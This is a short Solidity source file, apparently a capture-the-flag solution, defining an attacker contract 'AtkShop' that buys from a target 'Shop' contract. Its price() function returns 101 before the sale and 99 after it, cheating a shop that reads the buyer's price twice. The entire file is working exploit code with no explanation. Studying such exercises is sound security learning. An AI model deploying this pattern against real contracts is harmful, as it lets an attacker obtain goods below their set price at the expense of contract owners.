// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Shop  {
	  function buy() external;
    function isSold() external view returns (bool);
}


contract AtkShop {

    Shop public target ;

    constructor (address _target) {
      target = Shop(_target);
    }


    function price() external view returns (uint256){
     if( target.isSold() ){
        return 99;
      } else {
        return  101;
      }
    
    }

    function callBuy() external {
        target.buy();
    }


    
}